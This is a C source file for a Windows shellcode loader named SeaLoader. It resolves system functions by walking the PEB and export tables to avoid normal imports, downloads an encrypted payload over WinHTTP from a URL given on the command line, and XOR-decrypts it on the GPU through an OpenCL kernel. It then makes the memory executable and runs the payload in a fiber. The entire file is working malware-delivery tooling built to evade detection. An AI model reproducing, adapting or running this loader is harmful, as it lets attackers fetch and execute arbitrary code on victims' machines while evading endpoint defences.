#include <stdio.h>
#include <Windows.h>
#include <winhttp.h>

#include <CL/cl.h>

#include "SeaLoader.h"


// Macros
#define CHECK_CL_ERROR(err, message) \
    if (err != CL_SUCCESS) { \
        fprintf(stderr, "[-] OpenCL error (%d) at %s\n", err, message); \
        return err; \
    }


// Function Prototypes
cl_int init_opencl(OpenCL_Handles* handles);
cl_int run_decryption_kernel(OpenCL_Handles* handles, const BYTE* encryptedShellcode, size_t dataSize, const char* key, BYTE* decryptedShellcode);
void cleanup_opencl(OpenCL_Handles* handles);
void print_build_log(cl_program program, cl_device_id device);
PVOID NtGetCurrentHeap();
PPEB NtGetPEB();
void InitUnicodeString(UNICODE_STRING * dst, PCWSTR src);
HMODULE NtGetModuleHandleReverse(LPCWSTR moduleName);
FARPROC NtGetProcAddressReverse(HMODULE moduleBase, LPCSTR funcName);
BOOL InitInstance(_Out_ PINSTANCE pInstance);
BOOL ParseArgs(int argc, char* argv[], char* urlOut, size_t urlSize, _Out_ char* xorKeyOut, size_t xorKeySize);
BOOL ExecuteWithFibers(INSTANCE instance, PBYTE shellcode, DWORD shellcodeSize);
BOOL DownloadBuffer(_In_ INSTANCE instance, _In_ const char* url, PBYTE buffer, DWORD * outSize);


// == Utility ==
PVOID NtGetCurrentHeap() {
#ifdef _M_X64
    PVOID peb = (PVOID)__readgsqword(0x60);
    return *(PVOID*)((PBYTE)peb + 0x30);
#else
    PVOID peb = (PVOID)__readfsdword(0x30);
    return *(PVOID*)((PBYTE)peb + 0x18);
#endif
}

PPEB NtGetPEB() {
#ifdef _M_X64
    return (PPEB)__readgsqword(0x60);
#else
    return (PPEB)__readfsdword(0x30);
#endif
}

void InitUnicodeString(UNICODE_STRING* dst, PCWSTR src) {
    if ((dst->Buffer = (PWSTR)src)) {
        dst->Length = min((USHORT)(wcslen(src) * sizeof(WCHAR)), 0xfffc);
        dst->MaximumLength = dst->Length + sizeof(WCHAR);
    }
    else {
        dst->Length = dst->MaximumLength = 0;
    }
}

HMODULE NtGetModuleHandleReverse(LPCWSTR moduleName) {
    PPEB peb = NtGetPEB();
    PLIST_ENTRY list = peb->Ldr->InMemoryOrderModuleList.Blink;
    while (list != &peb->Ldr->InMemoryOrderModuleList) {
        PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(list, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (entry->BaseDllName.Buffer && _wcsicmp(entry->BaseDllName.Buffer, moduleName) == 0)
            return (HMODULE)entry->DllBase;
        list = list->Blink;
    }
    return NULL;
}

FARPROC NtGetProcAddressReverse(HMODULE moduleBase, LPCSTR funcName) {
    PBYTE base = (PBYTE)moduleBase;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    DWORD rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!rva) return NULL;

    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)(base + rva);
    DWORD* names = (DWORD*)(base + exports->AddressOfNames);
    WORD* ordinals = (WORD*)(base + exports->AddressOfNameOrdinals);
    DWORD* functions = (DWORD*)(base + exports->AddressOfFunctions);

    for (DWORD i = exports->NumberOfNames; i > 0; i--) {
        LPCSTR name = (LPCSTR)(base + names[i]);
        if (strcmp(name, funcName) == 0)
            return (FARPROC)(base + functions[ordinals[i]]);
    }
    return NULL;
}

BOOL InitInstance(_Out_ PINSTANCE pInstance) {
    memset(pInstance, 0, sizeof(INSTANCE));

    // Resolve Ntdll
    WCHAR wNtdll[] = L"ntdll.dll";
    pInstance->Modules.Ntdll = NtGetModuleHandleReverse(wNtdll);
    if (!pInstance->Modules.Ntdll) {
        return FALSE;
    }

    // Loop through and resolve ntdll functions
    for (size_t i = 0; i < (sizeof(g_NtdllFunctions) / sizeof(API_FUNCTION)); ++i) {
        // Calculate the address of the function pointer member in pInstance->Api
        PVOID* pApiFunctionPtr = (PVOID*)((BYTE*)&pInstance->Api + g_NtdllFunctions[i].ApiOffset);

        // Resolve the function address
        *pApiFunctionPtr = NtGetProcAddressReverse(pInstance->Modules.Ntdll, g_NtdllFunctions[i].Name);

        // Check if the function was resolved successfully
        if (*pApiFunctionPtr == NULL) {
            return FALSE;
        }
    }

    // Resolve WinHttp
    UNICODE_STRING uHttp;
    InitUnicodeString(&uHttp, L"winhttp.dll");

    if (pInstance->Api.LdrLoadDll(NULL, 0, &uHttp, &pInstance->Modules.WinHttp) != 0 /* STATUS_SUCCESS */) {
        return FALSE;
    }

    // Loop through and resolve winhttp functions
    for (size_t i = 0; i < (sizeof(g_WinHttpFunctions) / sizeof(API_FUNCTION)); ++i) {
        PVOID* pApiFunctionPtr = (PVOID*)((BYTE*)&pInstance->Api + g_WinHttpFunctions[i].ApiOffset);
        *pApiFunctionPtr = NtGetProcAddressReverse(pInstance->Modules.WinHttp, g_WinHttpFunctions[i].Name);

        if (*pApiFunctionPtr == NULL) {
            return FALSE;
        }
    }

    return TRUE; // Success!
}

// == OpenCL Functions ==
// -- Initialize OpenCL, also verify installed --
cl_int init_opencl(OpenCL_Handles* handles) {
    cl_int err;

    // Platform Discovery
    err = clGetPlatformIDs(1, &handles->platform_id, &handles->num_platforms);
    if (err == CL_PLATFORM_NOT_FOUND_KHR) {
        fprintf(stderr, "[-] No OpenCL platforms found. Check installation.\n");
        return err;
    }
    CHECK_CL_ERROR(err, "clGetPlatformIDs");

    // Device Discovery
    err = clGetDeviceIDs(handles->platform_id, CL_DEVICE_TYPE_GPU, 1, &handles->device_id, &handles->num_devices);
    if (err == CL_DEVICE_NOT_FOUND) { // Fallback to CPU if no GPU is found
        printf("[!] No GPU found. Trying CPU...\n");
        err = clGetDeviceIDs(handles->platform_id, CL_DEVICE_TYPE_CPU, 1, &handles->device_id, &handles->num_devices);
        if (err == CL_DEVICE_NOT_FOUND) {
            fprintf(stderr, "[-] No OpenCL devices (GPU or CPU) found.\n");
            return err;
        }
    }
    CHECK_CL_ERROR(err, "clGetDeviceIDs");

    // Create Context and Command Queue
    handles->context = clCreateContext(NULL, 1, &handles->device_id, NULL, NULL, &err);
    CHECK_CL_ERROR(err, "clCreateContext");

    handles->queue = clCreateCommandQueueWithProperties(handles->context, handles->device_id, NULL, &err);
    CHECK_CL_ERROR(err, "clCreateCommandQueueWithProperties");

    printf("[+] OpenCL initialized successfully.\n");
    return CL_SUCCESS;
}

// -- Load and decrypt shellcode --
cl_int run_decryption_kernel(OpenCL_Handles* handles, const BYTE* encryptedShellcode, size_t dataSize, const char* key, BYTE* decryptedShellcode) {
    cl_int err;
    const unsigned int keyLength = (unsigned int)strlen(key);

    const char* xorKernelSource =
        "__kernel void decrypt(__global const unsigned char* encryptedData, \n"
        "                      __global const char* xorKey, \n"
        "                      __global unsigned char* decryptedData, \n"
        "                      const unsigned int keyLength) \n"
        "{ \n"
        "    int gid = get_global_id(0); \n"
        "    if (keyLength > 0) { \n"
        "        decryptedData[gid] = encryptedData[gid] ^ xorKey[gid % keyLength]; \n"
        "    } \n"
        "} \n";

    // Create and Build Program
    handles->program = clCreateProgramWithSource(handles->context, 1, &xorKernelSource, NULL, &err);
    CHECK_CL_ERROR(err, "clCreateProgramWithSource");

    err = clBuildProgram(handles->program, 1, &handles->device_id, NULL, NULL, NULL);
    if (err != CL_SUCCESS) {
        fprintf(stderr, "[-] Kernel build failed.\n");
        print_build_log(handles->program, handles->device_id);
        return err;
    }

    handles->kernel = clCreateKernel(handles->program, "decrypt", &err);
    CHECK_CL_ERROR(err, "clCreateKernel");

    // Create Device Buffers
    cl_mem dev_encrypted_in = clCreateBuffer(handles->context, CL_MEM_READ_ONLY | CL_MEM_COPY_HOST_PTR, dataSize, (void*)encryptedShellcode, &err);
    CHECK_CL_ERROR(err, "clCreateBuffer (encrypted_in)");
    cl_mem dev_key_in = clCreateBuffer(handles->context, CL_MEM_READ_ONLY | CL_MEM_COPY_HOST_PTR, keyLength, (void*)key, &err);
    CHECK_CL_ERROR(err, "clCreateBuffer (key_in)");
    cl_mem dev_decrypted_out = clCreateBuffer(handles->context, CL_MEM_WRITE_ONLY, dataSize, NULL, &err);
    CHECK_CL_ERROR(err, "clCreateBuffer (decrypted_out)");

    // Set Kernel Arguments
    clSetKernelArg(handles->kernel, 0, sizeof(cl_mem), &dev_encrypted_in);
    clSetKernelArg(handles->kernel, 1, sizeof(cl_mem), &dev_key_in);
    clSetKernelArg(handles->kernel, 2, sizeof(cl_mem), &dev_decrypted_out);
    clSetKernelArg(handles->kernel, 3, sizeof(unsigned int), &keyLength);

    // Execute Kernel
    err = clEnqueueNDRangeKernel(handles->queue, handles->kernel, 1, NULL, &dataSize, NULL, 0, NULL, NULL);
    CHECK_CL_ERROR(err, "clEnqueueNDRangeKernel");

    // Read Result Back to Host
    err = clEnqueueReadBuffer(handles->queue, dev_decrypted_out, CL_TRUE, 0, dataSize, decryptedShellcode, 0, NULL, NULL);
    CHECK_CL_ERROR(err, "clEnqueueReadBuffer");

    // Cleanup
    clReleaseMemObject(dev_encrypted_in);
    clReleaseMemObject(dev_key_in);
    clReleaseMemObject(dev_decrypted_out);

    return CL_SUCCESS;
}

// -- Cleanup OpenCL resources --
void cleanup_opencl(OpenCL_Handles* handles) {
    if (handles->queue) clFinish(handles->queue);
    if (handles->kernel) clReleaseKernel(handles->kernel);
    if (handles->program) clReleaseProgram(handles->program);
    if (handles->queue) clReleaseCommandQueue(handles->queue);
    if (handles->context) clReleaseContext(handles->context);
    // Platform and device IDs do not need to be released.
}

// -- Print build info for debugging --
void print_build_log(cl_program program, cl_device_id device) {
    size_t log_size;
    clGetProgramBuildInfo(program, device, CL_PROGRAM_BUILD_LOG, 0, NULL, &log_size);
    char* log = (char*)malloc(log_size);
    if (log) {
        clGetProgramBuildInfo(program, device, CL_PROGRAM_BUILD_LOG, log_size, log, NULL);
        fprintf(stderr, "--- Build Log\n%s\n-----------------\n", log);
        free(log);
    }
}

// == Argument Parsing ==
BOOL ParseArgs(int argc, char* argv[], char* urlOut, size_t urlSize, _Out_ char* xorKeyOut, size_t xorKeySize) {
    urlOut[0] = xorKeyOut[0] = '\0';
    for (int i = 1; i < argc; i++) {
        if (strncmp(argv[i], "/p:", 3) == 0)
            strncpy_s(urlOut, urlSize, argv[i] + 3, _TRUNCATE);
        else if (strncmp(argv[i], "/x:", 3) == 0)
            strncpy_s(xorKeyOut, xorKeySize, argv[i] + 3, _TRUNCATE);
    }
    return (urlOut[0] != '\0');
}

// == Download Payload ==
BOOL DownloadBuffer(_In_ INSTANCE instance, _In_ const char* url, PBYTE buffer, DWORD* outSize) {
    WCHAR wUrl[2084] = { 0 }; MultiByteToWideChar(CP_ACP, 0, url, -1, wUrl, 2084);
    URL_COMPONENTS uc = { sizeof(uc) }; WCHAR host[256], path[1024];
    uc.lpszHostName = host; uc.dwHostNameLength = ARRAYSIZE(host);
    uc.lpszUrlPath = path; uc.dwUrlPathLength = ARRAYSIZE(path);
    if (!instance.Api.WinHttpCrackUrl(wUrl, 0, 0, &uc)) return 0;

    HINTERNET hSession = instance.Api.WinHttpOpen(L"SeaLoader/1.0", WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0);
    if (!hSession) return 0;
    HINTERNET hConnect = instance.Api.WinHttpConnect(hSession, uc.lpszHostName, uc.nPort, 0);
    DWORD flags = WINHTTP_FLAG_REFRESH | (uc.nScheme == INTERNET_SCHEME_HTTPS ? WINHTTP_FLAG_SECURE : 0);
    HINTERNET hRequest = instance.Api.WinHttpOpenRequest(hConnect, L"GET", uc.lpszUrlPath, NULL, NULL, NULL, flags);
    if (!instance.Api.WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0) || !instance.Api.WinHttpReceiveResponse(hRequest, NULL)) return 0;

    DWORD total = 0, read = 0;
    while (total < MAX_SHELLCODE_SIZE && instance.Api.WinHttpReadData(hRequest, buffer + total, MAX_SHELLCODE_SIZE - total, &read) && read > 0)
        total += read;
    *outSize = total;

    instance.Api.WinHttpCloseHandle(hRequest); instance.Api.WinHttpCloseHandle(hConnect); instance.Api.WinHttpCloseHandle(hSession);
    instance.Api.LdrUnloadDll(instance.Modules.WinHttp);
    return total > 0;
}

// == Execute Payload ==
BOOL ExecuteWithFibers(INSTANCE instance, PBYTE shellcode, DWORD shellcodeSize) {
    BOOL result = FALSE;
    PVOID shellcodeExec = NULL;
    HANDLE hProcess = NtCurrentProcess();
    SIZE_T regionSize = shellcodeSize;
    ULONG oldProtect;
    NTSTATUS status;

    // Convert the main thread to a fiber.
    PVOID mainFiber = ConvertThreadToFiber("MainThreadFiber");
    if (!mainFiber) {
        printf("[-] Failed to convert thread to fiber.\n");
        return 1;
    }

    // Allocate memory for the shellcode.
    status = instance.Api.NtAllocateVirtualMemory(hProcess, &shellcodeExec, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status != 0) {
        printf("[-] NtAllocateVirtualMemory failed: 0x%X\n", status);
        return 1;
    }

    printf("[+] Allocated memory at: 0x%p\n", shellcodeExec);

    // Copy the shellcode to the newly allocated memory.
    memcpy(shellcodeExec, shellcode, shellcodeSize);
    printf("[+] Copied shellcode to memory.\n");

    status = instance.Api.NtProtectVirtualMemory(hProcess, &shellcodeExec, &regionSize, PAGE_EXECUTE_READ, &oldProtect);
    if (status != 0) {
        printf("[-] NtProtectVirtualMemory failed: 0x%X\n", status);
        return 1;
    }

    // Cast the executable memory address to a function pointer.
    void (*shellcodeFunc)(void*) = (void (*)(void*))shellcodeExec;

    // Create a fiber that will execute the shellcode.
    PVOID shellcodeFiber = CreateFiber((SIZE_T)1024 * 64, shellcodeFunc, NULL);
    if (!shellcodeFiber) {
        printf("[-] CreateFiber for shellcode failed.\n");
        VirtualFree(shellcodeExec, 0, MEM_RELEASE);
        return 1;
    }
    printf("[+] Shellcode Fiber Created At Address: 0x%p \n", shellcodeFiber);

    // Switch to the shellcode fiber to execute it.
    printf("[+] Switching to shellcode fiber.\n");
    SwitchToFiber(shellcodeFiber);

    // The program probably won't reach this point, as the shellcode
    // typically calls ExitProcess or does not return.
    printf("[!] Returned from shellcode fiber.\n");

    // Clean up resources.
    DeleteFiber(shellcodeFiber);
    VirtualFree(shellcodeExec, 0, MEM_RELEASE);
}

// Main
int main(int argc, char* argv[]) {
    char url[MAX_URL_LENGTH] = { 0 };
    char xorKeyArg[MAX_XOR_KEY_LENGTH] = { 0 };
    INSTANCE instance = { 0 };

    // Parse command line arguments
    if (!ParseArgs(argc, argv, url, sizeof(url), xorKeyArg, sizeof(xorKeyArg))) {
        printf("Usage: %s /p:<url> /x:<xorkey>\n", argv[0]);
        return 1;
    }

    // Initialize and download shellcode
    InitInstance(&instance);
    BYTE* shellcode = (BYTE*)malloc(MAX_SHELLCODE_SIZE);
    if (!shellcode) {
        fprintf(stderr, "[-] Failed to allocate memory for shellcode buffer.\n");
        return 1;
    }
    DWORD shellcodeSize = 0;
    if (!DownloadBuffer(instance, url, shellcode, &shellcodeSize)) {
        fprintf(stderr, "[-] Failed to download shellcode.\n");
        free(shellcode);
        return 1;
    }
    printf("[+] Downloaded %u bytes.\n", shellcodeSize);

    // Initialize OpenCL platform, device, context, etc.
    OpenCL_Handles cl_handles = { 0 };
    if (init_opencl(&cl_handles) != CL_SUCCESS) {
        fprintf(stderr, "[-] Failed to initialize OpenCL.\n");
        free(shellcode);
        cleanup_opencl(&cl_handles); // Attempt to clean up partial initialization
        return 1;
    }

    // Allocate buffer for the final decrypted payload
    BYTE* finalShellcode = (BYTE*)malloc(shellcodeSize);
    if (!finalShellcode) {
        fprintf(stderr, "[-] Failed to allocate memory for the final shellcode.\n");
        free(shellcode);
        cleanup_opencl(&cl_handles);
        return 1;
    }

    // Run the decryption on the GPU
    printf("[+] Decrypting payload on the GPU...\n");
    if (run_decryption_kernel(&cl_handles, shellcode, shellcodeSize, xorKeyArg, finalShellcode) != CL_SUCCESS) {
        fprintf(stderr, "[-] Failed to execute decryption kernel.\n");
        free(shellcode);
        free(finalShellcode);
        cleanup_opencl(&cl_handles);
        return 1;
    }
    else {
        printf("[+] Decryption complete.\n");
    }

    ExecuteWithFibers(instance, finalShellcode, shellcodeSize);

    // Cleanup
    free(shellcode);
    free(finalShellcode);
    cleanup_opencl(&cl_handles);

    return 0;
}
